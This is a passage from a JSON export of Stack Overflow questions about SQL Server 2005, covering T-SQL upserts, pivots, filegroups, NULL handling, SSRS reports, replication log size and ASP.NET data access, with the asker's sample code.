process.</p>\n"},{"tags":["sql","sql-server-2005","tsql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":314,"score":0,"question_id":7376480,"title":"How to insert or update a dbf file in a SQL Server 2005 trigger?","body":"<p>I would like to insert or update a dbf file inside a after insert, update, delete trigger of SQL Server 2005.</p>\n\n<p>I have come up with this</p>\n\n<pre><code>INSERT INTO openrowset('MSDASQL','Driver={Microsoft Visual FoxPro Driver};SourceDB=C:\\DBASE;SourceType=DBF','select * from persons')\nSELECT 'coke','zero',4004\n</code></pre>\n\n<p>it works fine when I'm running it in SQL Server Management Studio or when I compile the trigger\nbut when I use our front end .NET program to update data an message box pops up saying</p>\n\n<blockquote>\n  <p>The operation could not be performed because OLE DB provider \"MSDASQL\"\n  for linked server \"(null)\"</p>\n</blockquote>\n\n<p>help pls? thanks!</p>\n"},{"tags":["sql-server-2005","pivot"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":11903912,"title":"Combining columns with no common element (pivot) in SQL Server","body":"<p>I am trying to find the best way to display some data.</p>\n\n<p>My dataset looks like this:</p>\n\n<pre><code>Form  var1_Day  var1_WTD  var1_30Day  var2_Day  var2_WTD  var2_30Day ...\nNA    null      null      null        77        448       2581\nA1    166       791       4842        null      null      null\nA2    304       1312      8365        null      null      null\nA3    29        113       656         null      null      null\n</code></pre>\n\n<p>I am trying to figure out how I would go about displaying the data like this:</p>\n\n<pre><code>Var   Form  Day   WTD   30Day\nvar1  NA    null  null  null\nvar1  A1    166   791   4842\nvar1  A2    304   1312  8365\nvar1  A3    29    113   656\nvar2  NA    77    448   2581\nvar2  A1    null  null  null\nvar2  A2    null  null  null\nvar2  A3    null  null  null\n...\n</code></pre>\n\n<p>I believe I will have to use a pivot table but am not sure where to start.</p>\n\n<p>Thank You,\nBrad</p>\n"},{"tags":["sql-server-2005","reporting-services"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":20,"score":0,"question_id":11904658,"title":"Displaying the records that are logged not on random time intervals, every one hour to make a report using ssrs","body":"<p>First of all I am new user for SQL Server</p>\n\n<p>Required from SQL: creating a daily report in the form of a matrix that consists of 24 rows representing the 24 hours of the day and the columns represent  measurements coming out of different sensors .</p>\n\n<p>The problem is not on how to create the report, but in the sql table used to build it. as this table is not logged on hourly basis but on exception basis which means if the sensor's measured value is changed over a 10 % it will be logged otherwise it will not. a lot of time many sensors have their values not changing above 10% for many hours which mean that no corresponding logs will be available in the sql table for these sensors at this hours. how can i fill these data in the report during hours that was not logged. also there are some sensors that are varying so much which is logged every 2 or 3 minutes how can i select only the value at the end of each hour (i.e: 5:00, 6:00,7:00) while the available logs for these sensors are like (5.6 @ 5:04 , 6.3 @ 5:07 , ............., 4.2 @ 6:40 ,5.3 @ 6:45)</p>\n\n<p>sorry for my poor English </p>\n\n<p>please help me as i need it urgently\nthanks in advance</p>\n"},{"tags":["sql","sql-server","security","sql-server-2005","sql-server-2008"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":904,"score":1,"question_id":7127602,"title":"Restrict SQL Server Connection to Specific IP Address","body":"<p>I want to restrict the connections to my SQL Server instance to specific IP addresses. I want to prevent any connections from any IP addresses except specific list. Is this something that can be configured in SQL Server instance or database?</p>\n"},{"tags":["internet-explorer","sql-server-2005","ssrs-reports"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":246,"score":0,"question_id":11899479,"title":"Internet Explorer Cannot display the webpage SQL Server Reporting Services","body":"<p>I've been looking at this problem now for sometime now and I can not work it through.</p>\n\n<p>I recently made a change to Report and uploaded it via the Reports home webpage. The report runs fine and is created successfully for me.</p>\n\n<p>However, when a user tries to open the report (by selecting it from a drop down list from our website) they are met with a \"Internet Explorer cannot display the webpage\" page.</p>\n\n<p>This is odd because they can load other reports on the Test system, and they can view the same report on Production. However, they seem to be unable to load reports from a single subfolder of all the reports. All folders of reports have the same secuirty rights though.</p>\n\n<p>I've been over all the log files (that I can find) and there is nothing.</p>\n\n<p>In the Report Services trace log files there is no mention of this error or attempt, only details of how I successfully loaded the report.</p>\n\n<p>There are no errors in the Windows Application/System/Security log files.</p>\n\n<p>There are no records of the attempt for the Http logfiles on the report server.\nFrom the website Http logfiles, there are logs of successful attempts to contact the webpage for the report, but once it is passed to the Reports Site, the trail just dies for the user. (Not so for my attempts.)</p>\n\n<p>All the logfiles do have the correct logs for my successful attempts.</p>\n\n<p>If this was a security issue, would there be something in the logs to say \"access denied\"? Is it possible it's a secuirty issue even though the user can view other reports on test without a hitch?</p>\n\n<p>I have reveresed out the changes in the .rdl file and the report still does not load for them so it is not the reports themselves that are causing the issue. (They do load fine for me!)</p>\n\n<p>I can't think of what else to do. The user unfortunately cannot uncheck the \"friendly error messages\" or lower is IE settings as he does not have control (and is unwilling it seek it.)</p>\n\n<p>Has anyone else experienced this issue?</p>\n\n<p>I am using SQL Server 2005</p>\n\n<p>Please let me know if you would like any further information</p>\n\n<p>Thanks for your help!</p>\n\n<p>Ross</p>\n"},{"tags":["asp.net","visual-studio-2010","sql-server-2005","c#-2.0","login-control"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2254,"score":0,"question_id":8992989,"title":"How to connect a Visual Studio 2010 website to SQL Server 2005","body":"<p>I need to connect Visual Studio 2010 website to SQL Server 2005. My web site is ASP.NET using C#,\non the .NET Framework 2.0</p>\n\n<p>I googled it for hours and every site i entered the information didn't seemed relevant.</p>\n\n<p>Maybe I just don't understand. </p>\n\n<p>I would appreciate if someone showed me from where to begin.</p>\n\n<p>For example: I created a login form using login control from the toolbox but don't know how to continue from here, how do I get the password and username from the database?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":253,"score":2,"question_id":11883237,"title":"INSERT or UPDATE table from another table with composite primary key","body":"<p>I am looking for the correct syntax and way to do the following directly from SQL: insert or update (if data already exists inside) <code>TableMain</code> from data contained in <code>TableA</code> with both having same composite primary key.</p>\n\n<p>Both tables are defined as :</p>\n\n<pre><code>CREATE TABLE TableA (\n[TID0] [int] NOT NULL,\n[TID1] [int] NOT NULL,\n[language] [nvarchar](2) NOT NULL,\n[TID2] [nvarchar](200) NOT NULL,\n[text] [nvarchar](max) NULL,\n[updatedOn] [datetime] NOT NULL  DEFAULT (getdate())\nPRIMARY KEY (\n    [TID0],\n    [TID1],\n    [language],\n    [TID2],\n)\n) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY]\n</code></pre>\n\n<p><code>TableA</code> will be periodically deleted and filled.</p>\n\n<p><code>TableMain</code> as the same definition but will contain many more rows of data and what I need is to insert never seen values from <code>TableA</code> into <code>TableMain</code>, and update already existing rows.</p>\n\n<p>I used to do this kind of insert but I do not know how to handle update and composite primary keys :</p>\n\n<pre><code>INSERT INTO TableMain \n    SELECT * FROM TableA\n</code></pre>\n\n<p>EDIT : i am using <strong>SQL Server 9.00.5000</strong></p>\n\n<p>EDIT : another way inspired by MERGE and <a href=\"http://sqlserver-tips.blogspot.fr/2006/09/mimicking-merge-statement-in-sql.html\" rel=\"nofollow\">mimick it</a></p>\n\n<pre><code>DECLARE @updatedIDs TABLE(\n    [TID0] [int],\n    [TID1] [int],\n    [language] [nvarchar](2),\n    [TID2] [nvarchar](200),\n                PRIMARY KEY ([TID0], [TID1], [language], [TID2])  -- as stated by Nikola Markovinović above, thanks\n);\n\n-- First update records \nupdate TableMain \n   set [text]      = source.[text], \n       [updatedOn] = source.[updatedOn] \n       OUTPUT\n         inserted.[TID0]\n         inserted.[TID1]\n         inserted.[language]\n         inserted.[TID2]\n       INTO @updatedIDs\n  from \n       TableMain AS main\n       , TableA AS source \n  WHERE    \n   TableMain.[TID0]         = source.[TID0] \n   and TableMain.[TID1]     = source.[TID1] \n   and TableMain.[language] = source.[language] \n   and TableMain.[TID2]     = source.[TID2] \n\n-- And then insert \n\ninsert into TableMain\nselect *\n  from TableA AS source \n where not exists \n       ( \n      select 1\n        from @updatedIDs AS i\n       where i.[TID0]     = source.[TID0] \n         and i.[TID1]     = source.[TID1] \n         and i.[language] = source.[language] \n         and i.[TID2]     = source.[TID2] \n       )\n</code></pre>\n"},{"tags":["asp.net","sql-server-2005","google-maps"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":147,"score":0,"question_id":11896068,"title":"Google map for asp.net","body":"<p>I have  sql server table,in which one column is Latitude and other column is longitude.I have 950 rows in this table.Now i want to add Google map marker point for all this 950 rows.so totally 950 points.I am using Google map control for ASP.Net for doing this task.For adding a single point in a map, following are the code.</p>\n\n<pre><code>GooglePoint GP = new GooglePoint();\nGP.Latitude = 43.65669;\nGP.Longitude = -79.43270;\nGoogleMapForASPNet1.GoogleMapObject.Points.Add(GP);\n</code></pre>\n\n<p>Now i want to take this lat and long from my sql server table.so that it should add itself all the points in the map.Please help me how to do this.Any example code??\nNow i have tried with this code.But i didn't get the point.</p>\n\n<pre><code>protected void Page_Load(object sender, EventArgs e)\n    {\n        GoogleMapForASPNet1.GoogleMapObject.Width = \"1000px\";\n        GoogleMapForASPNet1.GoogleMapObject.Height = \"800px\";\n        GoogleMapForASPNet1.GoogleMapObject.MapType = \"Hybrid\";\n\n        SqlConnection con = new SqlConnection();\n        con.ConnectionString = \"Data Source=GEOFINY5;Initial Catalog=sample;Integrated Security=True\";\n        try\n        {\n            SqlCommand cmd = new SqlCommand(\"Select lat,long from map\",con);\n            con.Open();\n            SqlDataReader dr = cmd.ExecuteReader();\n            //int i = 0;\n            while (dr.Read())\n            {\n                GooglePoint gp = new GooglePoint();\n                //gp.ID = i.ToString;\n                gp.Latitude = Convert.ToDouble(dr.GetValue(1));\n                gp.Longitude = Convert.ToDouble(dr.GetValue(2));\n                gp.InfoHTML = \"Hello!!\";\n                GoogleMapForASPNet1.GoogleMapObject.Points.Add(gp);\n            }\n            con.Close();\n\n        }\n        catch(Exception ex)\n        {\n\n        }\n\n    }\n</code></pre>\n\n<p>Note:\n     I have used Google Map JavaScript API V3 with fusion tables already.But now i would prefer doing with sql server rather than fusion tables.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","database-design","filegroup"],"answer_count":5,"favorite_count":5,"up_vote_count":9,"down_vote_count":0,"view_count":7294,"score":9,"question_id":544898,"title":"SQL Server 2005 / 2008 - multiple filegroups?","body":"<p>I'm a developer at heart - but every now and then, a customer doesn't have a decent DBA to deal with these issues, so I'm called in to decide....</p>\n\n<p>What are your strategies / best practices when it comes to dealing with a reasonably sized SQL Server database (anything larger than Northwind or AdventureWorks) - do you use multiple filegroups? If so: how many? And why?</p>\n\n<p>What are your criteria to decide when to move away from the \"one filegroup for everything\" approach:</p>\n\n<ul>\n<li>database size?</li>\n<li>database complexity?</li>\n<li>availability / reliability requirements?</li>\n<li>what else?</li>\n</ul>\n\n<p>If you use multiple file groups, how many do you use? One for data, one for index, one for log? Several (how many) for data? What are your reasons for your choice - <em>why</em> do you use that exact number of filegroups :-) </p>\n"},{"tags":["sql-server-2005","filegroup"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":175,"score":0,"question_id":6163649,"title":"Tables in 2 filegroups sql server","body":"<p>My predecessor for some reason split the data between two filegroups in our SQL Server 2005 database.</p>\n\n<p>I'm thinking about just putting everything in one.</p>\n\n<p>Any speculation on why someone would split things between filegroups with two files on the same server?</p>\n\n<p>How do I put all of the objects in a single group?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","triggers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":116,"score":0,"question_id":11786568,"title":"Creating a update status trigger in SQL Server 2005","body":"<p>I have 2 tables like so:</p>\n\n<p><strong>JOBS</strong> table</p>\n\n<pre><code>Jobcode    UserId    Status\n101        130       R\n102        139       D\n</code></pre>\n\n<p><strong>USERS</strong> table</p>\n\n<pre><code>UserId    Email\n130       test@example.com\n</code></pre>\n\n<p>I want to create a trigger on insert and update that sends an email to my stored procedure:</p>\n\n<pre><code>EXEC dbo.SendMyEmail @email, @jobcode;\n</code></pre>\n\n<p>when the jobcode is inserted as 'D' or updated to 'D'.</p>\n"},{"tags":[".net","asp.net","sql-server","sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":230,"score":1,"question_id":3710458,"title":"Issue when running SQL Server 2005 SSIS Package on Remote Server","body":"<p>i created a SSIS package on my development machine which simply:\n1) Deletes records from weak table in database.\n2) Loads file from filesystem into weak table in database.\n3) The package is called from an asp.net page</p>\n\n<p>When i run the package manually on my machine it works, when the protection level is EncryptSensitiveWithUserKey. When i deploy i change the protection level to 'DontSaveSensitive'.</p>\n\n<p>When i run the web application , i get this error - \n<strong>\"An OLE DB error has occurred. Error code: 0x80040E4D. An OLE DB record is available. Source: \"Microsoft SQL Native Client\".</strong></p>\n\n<p>Unfortunately i don't have much access to the SQL Server 2005 instance on the remote server to run it manually.</p>\n\n<p>When i deploy the package, i include an xml config file and include the password in the connectionstring property.</p>\n\n<p>Also i've turned on logging, but cannot see anything written to Event Log or SQL Server.\nCan someone pls refer me to log table that SSIS writes to? I've checked in MSDB. Is it sysdtslog90?</p>\n\n<p>Can someone please give me some pointers to what i can use to troubleshoot this.</p>\n\n<p>Regards</p>\n"},{"tags":[".net","sql-server","sql-server-2005","tsql","rounding"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":3775,"score":4,"question_id":3509891,"title":"Get only two decimal points in money datatype in SQL Server","body":"<pre><code>SELECT ROUND(123.4567, 2)` gives me `123.4600`\n</code></pre>\n\n<p>But I need <code>123.46</code>.</p>\n\n<p>Data type of field is money.</p>\n\n<p><strong>Solution:</strong></p>\n\n<pre><code>&lt;%# DataBinder.Eval(Container.DataItem, \"FieldName\",\"{0:0.00}\") %&gt;\n</code></pre>\n"},{"tags":["tsql","sql-server-2005","null","concatenation"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":111,"score":1,"question_id":11882920,"title":"Threats / drawbacks behind ISNULL(), NULLIF(), and COALESCE()","body":"<p>I am working on a Microsoft SQL Server 2005 with Transact-SQL.</p>\n\n<p>I am trying to concatenate string values coming from different columns of the same table dealing with NULL values.</p>\n\n<p>Say for example the table is <code>Person</code> and the columns are <code>FirstName</code>, <code>SurnamePrefix</code>, <code>LegalSurname</code></p>\n\n<p>It happened that concatenating a string value with a NULL value (coming from two different columns) returns in output a NULL value.\nI tried different scenarios to prevent NULL values in output:</p>\n\n<ul>\n<li>Starting from: \n<ul>\n<li><code>Person.FirstName + ' ' + COALESCE(RTRIM(LTRIM(Person.SurnamePrefix)) + ' ', '') + Person.LegalSurname</code></li>\n</ul></li>\n<li>I changed my statement to:\n<ul>\n<li><code>COALESCE(Person.FirstName + ' ', '') + COALESCE(Person.SurnamePrefix, '') + COALESCE(' ' + Person.LegalSurname, '')</code></li>\n</ul></li>\n</ul>\n\n<p>Then I came across functions like <code>ISNULL()</code>, <code>NULLIF()</code> etc.</p>\n\n<p>Which is the best and efficient approach to show empty strings values in output rather than NULL values?\nIs the solution affected by the version of the SQL Server? (i.e. 2005, 2008, etc.)</p>\n"},{"tags":["sql","sql-server-2005","insert","union"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":11886776,"title":"Can I INSERT a row at index n of a table?","body":"<p>I know I can do a <code>UNION</code> - but is there a better way to do this? We are using dynamic <code>SQL</code> and have it stored in tables with some the statements having an <code>ORDER BY</code> clause. I have to add a dynamic 'All' option, which is also stored in the database, to the top position to fill a drop-down in the app layer.</p>\n\n<p>I know this is a wonky solution, but I'm trapped by the application's current design. The other option is adding a bunch of code to the data model and app layer in addition to changing the stored procedure. If <code>UNION</code> is my only/best option, I can do that. I was just wondering if there was a better way <em>on the database side</em>.</p>\n\n<p>Also, I don't want a discussion on the merit of dynamic <code>SQL</code> strings stored in a database. It's the way it is and it's what I have to work with. Thanks all!</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1577,"score":2,"question_id":2142907,"title":"SQL Join on Nearest less than date","body":"<p>Normally I would just do this in the code itself, but I am curious if this can be accomplished efficiently in TSQL.</p>\n\n<pre>Table 1 \nDate - Value\n</pre>\n\n<pre>Table 2\nDate - Discount\n</pre>\n\n<p>Table 1 contains entries for each day.  Table 2 contains entries only when the discount changes.  A discount applied to a value is considered valid until a new discount is entered.</p>\n\n<p>Example data:</p>\n\n<pre>Table 1  \n1/26/2010 - 10  \n1/25/2010 - 9  \n1/24/2010 - 8  \n1/24/2010 - 9   \n1/23/2010 - 7    \n1/22/2010 - 10  \n1/21/2010 - 11\n</pre>\n\n<pre>\nTable 2\n1/26/2010 - 2  \n1/23/2010 - 1  \n1/20/2010 - 0  \n</pre>\n\n<p>What I need returned is the following: <code>T1 Date - T1 Value - T2 Discount</code></p>\n\n<p>Example data:</p>\n\n<pre>\n1/26/2010 - 10 - 2    \n1/25/2010 - 9  - 1  \n1/24/2010 - 8  - 1  \n1/24/2010 - 9  - 1  \n1/23/2010 - 7  - 1    \n1/22/2010 - 10 - 0  \n1/21/2010 - 11 - 0  \n</pre>\n\n<p>Possible or am I better off just continuing to do this in the code?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":11884920,"title":"SELECT CASE WHEN TINYINT field condition met return string","body":"<p>I am using SQL Server 2005. I am trying to do a select from a TINYINT field. If the field's value is 0 I want to select an empty string instead ' ' . The fields name is level. HEre is what I am doing:</p>\n\n<pre><code>SELECT \n[Level] = \nCase \nt.[Level]\n    WHEN 0 THEN ' '\n    ELSE t.[Level]\nEND\nFROM table t \n</code></pre>\n\n<p>This code always returns 0. I was  trying to troubleshoot the issue and tried this: </p>\n\n<pre><code>SELECT \n[Level] = \nCase \nt.[Level]\n    WHEN 0 THEN 'test'\n    ELSE t.[Level]\nEND\nFROM table t \n</code></pre>\n\n<p>And I got a the error <code>Conversion failed when converting the varchar value 'test' to data type tinyint</code></p>\n\n<p>So I'm seeing that there is a conversion problem here. I've tried:</p>\n\n<pre><code>SELECT \n[Level] = \nCase \nt.[Level]\n    WHEN 0 THEN CONVERT(VARCHAR,t.[level])\n    ELSE t.[Level]\nEND\nFROM table t \n</code></pre>\n\n<p>But this of course still returns 0, just the character, so it's still not doing what I need. I am thinking that there is most likely a better way to do this but am not sure how to approach it. Could anyone give me some advice on how to handle this? Thanks much!</p>\n"},{"tags":["xml","sql-server-2005","xml-parsing","xml-serialization"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":346,"score":2,"question_id":11880897,"title":"Best way to bulk insert XML data into SQL Server 2005 database","body":"<p>I have to shred around 25 - 30 XMLs into my SQL Server 2005 database (the total size would be around 10 MB). And I need this logic to run automatically as soon as new xml files are copied to the server.</p>\n\n<p>Ive read many posts on this site and also other sites, but can't still conclude on what must I use to shred data.</p>\n\n<p>Pls let me know which option must I should go with</p>\n\n<ol>\n<li>SqlBulk Copy</li>\n<li>C# deserialization</li>\n<li>SSIS</li>\n</ol>\n\n<p>I have to create C# classes for my data models. So C# deserialization was my first choice.\nBut pls let me know which option will be right from a performance perspective.</p>\n\n<p>Another thing I forgot to mention was the structure of the XML files will vary. It wouldnt be the same. I will have tables that will have all the columns that could possibly be populated. But the xmls will not have all the data at all times.</p>\n\n<p>Sample of the xml</p>\n\n<pre><code>&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;\n&lt;estateList date=\"2012-08-06T12:17:05\"&gt;\n  &lt;uniqueID&gt;22XXln&lt;/uniqueID&gt;\n  &lt;category name=\"Apartment\" /&gt; \n  &lt;listingAgent&gt;\n     &lt;name&gt;DIW Office&lt;/name&gt;  \n     &lt;telephone type=\"BH\"&gt;96232 2345&lt;/telephone&gt; \n     &lt;telephone type=\"BH\"&gt;9234 2399&lt;/telephone&gt;\n     &lt;email&gt;abcd@abc.com&lt;/email&gt;    \n  &lt;/listingAgent&gt;\n  &lt;inspectionTimes /&gt; \n  &lt;description&gt;AVAILABLE NOW. &lt;/description&gt; \n  &lt;price&gt;0&lt;/price&gt;  \n  &lt;address display=\"yes\"&gt;      \n    &lt;street&gt;Lachlsan Street&lt;/street&gt;        \n    &lt;ImagesContainer&gt;        \n       &lt;img id=\"m\" modTime=\"2012-08-06-12:17:05\" url=\"http://images/2409802.jpg\" format=\"jpg\" /&gt; \n       &lt;img id=\"a\" modTime=\"2012-08-06-12:17:05\" /&gt; \n    &lt;/ImagesContainer&gt;     \n  &lt;/address&gt;\n&lt;/estateList&gt;\n</code></pre>\n\n<p>Thanks.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":276,"score":-1,"question_id":11877809,"title":"Couldn't locate .ndf files of new file groups added","body":"<p>When I run this statement in SQL Server:</p>\n\n<pre><code>USE [master]\nGO\nALTER DATABASE &lt;DBName&gt; ADD FILEGROUP &lt;[FGName]&gt;\n</code></pre>\n\n<p>Where is the corresponding <code>.ndf</code> file created on disk?</p>\n\n<p>When I run that query, it's successful and I am able to find the new file group being added to the <code>sys.filegroups</code> table.</p>\n\n<p>But when I run </p>\n\n<pre><code>select * from sys.database_files \n</code></pre>\n\n<p>I am not able to find the files created for the new file group. I couldn't find it in the disk as well. What am I doing wrong? </p>\n\n<p>Could somebody help with this..?</p>\n"},{"tags":["sql","sql-server-2005","subquery","user-defined-functions"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":191,"score":1,"question_id":11864011,"title":"SQL Server : table-valued function does not work with sub query","body":"<p>I have a SQL Server table-valued function which is created by me I have pasted the create script below </p>\n\n<pre><code>CREATE FUNCTION [dbo].[getTableFromString]\n(       \n    @String AS nvarchar(max)\n\n)\nRETURNS @ReturnTable TABLE ( StringValues nvarchar(10)  )   \nAS begin \n\n    if (SELECT CHARINDEX(',', @String)) = 0\n        begin\n                insert into @ReturnTable (StringValues) values (subString(@String,1,len(@String)));\n        end \n    else\n        begin \n            while (SELECT CHARINDEX(',', @String)) &gt; 0\n            begin \n                insert into @ReturnTable (StringValues) values (subString(@String,1,CHARINDEX(',', @String)-1));\n                set @String  = subString(@String,CHARINDEX(',', @String)+1,len(@String));\n\n                if (SELECT CHARINDEX(',', @String)) = 0\n                begin\n                        insert into @ReturnTable (StringValues) values (subString(@String,1,len(@String)));\n                end         \n            end \n        end\n\n    return ;\nend\n</code></pre>\n\n<p>and I am using this function like below </p>\n\n<pre><code>Select sum(NetSales)\nfrom vwxsalesall\nwhere Company = 'rs'\nand storecode = (select cPrimaryStockRoomCode from CompanyMaster.CompanyProfileDetail where cCompanyNo = 'rs' and cSecondaryStockRoomCode = 'R01B')\nand trandate &gt;= '2012-01-01'\nand trandate &lt;= '2012-01-31'\nand ( \n        brand in (  \n                    select StringValues from  dbo.getTableFromString(\n                                                                    select vIncludedBrandCodes\n                                                                    from StockRoomTargetData.MonthlyTarget \n                                                                    where cCompanyNo = 'rs' \n                                                                    and cSecondaryStockRoomCode = 'R01B'\n                                                                    and nYear = 2012 \n                                                                    and nMonth = 8\n                                                                    )  \n                 ) \n    )\n</code></pre>\n\n<p>Unfortunately I am getting this  error </p>\n\n<blockquote>\n  <p>Msg 156, Level 15, State 1, Line 10<br>\n  Incorrect syntax near the keyword 'select'.<br>\n  Msg 102, Level 15, State 1, Line 16<br>\n  Incorrect syntax near ')'.</p>\n</blockquote>\n\n<p>please help me </p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":121,"score":1,"question_id":11876750,"title":"OPENXML, Convert Base64 to Binary","body":"<p>For an import/export process, we put binary data into XML as Base64 encoded strings.  The issue came up when getting the values back out...</p>\n\n<p>We're using OPENXML because performance on 2005/2008 is horrid using <a href=\"http://msdn.microsoft.com/en-us/library/ms188282.aspx\" rel=\"nofollow\">nodes()</a> - it doesn't scale well at all.  They fixed the performance issue in SQL Server 2012, but for the sake of legacy support (2005+) it's not a realistic option, and MS doesn't appear to want to backport things (assuming even possible).</p>\n\n<p>Here's some <a href=\"http://blogs.msdn.com/b/sqltips/archive/2008/06/30/converting-from-base64-to-varbinary-and-vice-versa.aspx\" rel=\"nofollow\">relevant info on the subject</a>.</p>\n\n<p>Ideally, I'm looking for a single SQL statement using OPENXML to shred an XML document that contains binary data encoded to Base64, and provide a result set there that data is correctly rendered as binary data.  I have one solution that doesn't use nodes, hoping someone has something better.</p>\n"},{"tags":["sql-server-2005"],"answer_count":1,"favorite_count":3,"up_vote_count":3,"down_vote_count":0,"view_count":2146,"score":3,"question_id":5789836,"title":"How to reduce ldf file size if we have applied replication on database","body":"<p>I have a Database that is using replication. Now I want to reduce the LDF file size (currently the size of the LDF is 6 GB).</p>\n\n<p>I did \"shrink\" the LDF files, but it shrank only a few MBs. We need to look for other options for it because these database are using replication. Is any solution available for it?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":185,"score":2,"question_id":11850334,"title":"sql server coalesce get first not null date","body":"<p>I am using SQL Server 2008.\nI was wondering if this is the best code to get the first not null date:</p>\n\n<pre><code>    select actualdate = coalesce((select date1 from table1), (select date2 from table2))\n</code></pre>\n"},{"tags":["sql","sql-server","sql-server-2005","tsql"],"answer_count":5,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":16947,"score":6,"question_id":1152932,"title":"Column name or number of supplied values does not match table definition","body":"<p>In SQL server, I am trying to insert values from one table to another by using the below query :</p>\n\n<pre><code>delete from tblTable1\n\ninsert into tblTable1 select * from tblTable1_Link\n</code></pre>\n\n<p>I am getting the following error :</p>\n\n<pre><code>Column name or number of supplied values does not match table definition.\n</code></pre>\n\n<p>I am sure that both table having same structure,column names and same data type:</p>\n\n<p>Please help!</p>\n"},{"tags":["sql","sql-server-2005","sql-server-2008","ftp","transactional-replication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":562,"score":0,"question_id":7664671,"title":"Can SQL Transactional Replication work between SQL 2005 Standard (Publisher) and SQL 2008 R2 Web (Subscriber)?","body":"<p>I've been trying, googling and hitting my head against the wall but can't figure our what the problem is or how to solve it.</p>\n\n<p>I have and SQL 2005 Standard server acting as a publisher. I need to do transactional replication to an SQL 2008 R2 Web server on another location. </p>\n\n<p>I've set up the publication, and enabled FTP access to get the snapshot.</p>\n\n<p>On the 2005 server when I launch replication monitor it keeps saying Uninitialized Subscription.</p>\n\n<p>If I test this with a different subscriber that is running SQL 2008 Enterprise, it works fine.</p>\n\n<p>Could it be because of the version? Could it be the SQL 2008 R2 Web can't work as a subscriber with SQL 2005?</p>\n\n<p>Thanks,\nFederico</p>\n"},{"tags":["sql-server-2005","stored-procedures","autocomplete"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":15,"score":1,"question_id":11871036,"title":"'%%' Throwing off results","body":"<p>I have written a stored procedure in sql server 2005 that searches for results.  </p>\n\n<p>SP</p>\n\n<pre><code>SELECT RTRIM(DEPT_DESC) DEPT_DESC, RTRIM(DEPT_ID) DEPT_ID\nFROM T_ROLLUP_DEPT\nWHERE DEPT_ID like @SearchText + '%' OR DEPT_DESC like '%%' \n</code></pre>\n\n<p>I added the '%%' to help it search within columns.</p>\n\n<p>ie If we are searching for Medical Controller, it would allow us to type 'CONTRO' and it would yield the results Medical Controller.  </p>\n\n<p>However, this has also caused some headaches.  It seems that if I am searching by dept_id and type in '2' it brings up ALL the results. Not only the department IDs that start with 2.  Also if I type in a bunch of random numbers it also comes back with ALL the results.</p>\n\n<p>Anyone know why and how this could be fixed?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":113,"score":1,"question_id":11869550,"title":"Delete all but top record in SQL server","body":"<p>I'm trying to write a script to delete all records except for the top one (if it's just any one that's fine too, there just have to be one record left). Here's the format I have as of now:</p>\n\n<pre><code>DELETE FROM table\nWHERE id NOT IN (\n  SELECT id\n  FROM (\n    SELECT id\n    FROM table\n    ORDER BY id DESC\n    LIMIT 1 ))\n</code></pre>\n\n<p>But I realize that LIMIT is not a recognized function in SQL server 2005, so I'm kind of stuck as to what to do. Anyone have any expert knowledge on this topic? And these records are NOT duplicated, I just want to take out all but one record.</p>\n\n<p>UPDATE:</p>\n\n<p>I realized that what I'm trying to accomplish here isn't completely clear. What I need to do is to delete all but the top record in this table given that it has the same value in another column (let's call it 'anotherid').</p>\n\n<p>so its like from this:</p>\n\n<pre><code>id        value       anotherid       \n1          3           1\n2          4           1\n3          5           2\n4          6           2\n5          7           2\n</code></pre>\n\n<p>To this:</p>\n\n<pre><code>id        value       anotherid       \n1          3           1\n3          5           2\n</code></pre>\n"},{"tags":["asp.net","sql-server-2005","stored-procedures"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":11869638,"title":"Adding Dividers","body":"<p>I currently have a Storedproc t hat is returning values for me to bind with a gridview in asp.net.  One thing I want to do is combine two fields into one seperated by a / but I cannot seem to get this working.</p>\n\n<p>Here is my stored proc</p>\n\n<pre><code>DECLARE @SQL VARCHAR(MAX);\n\nBEGIN\nSET @SQL 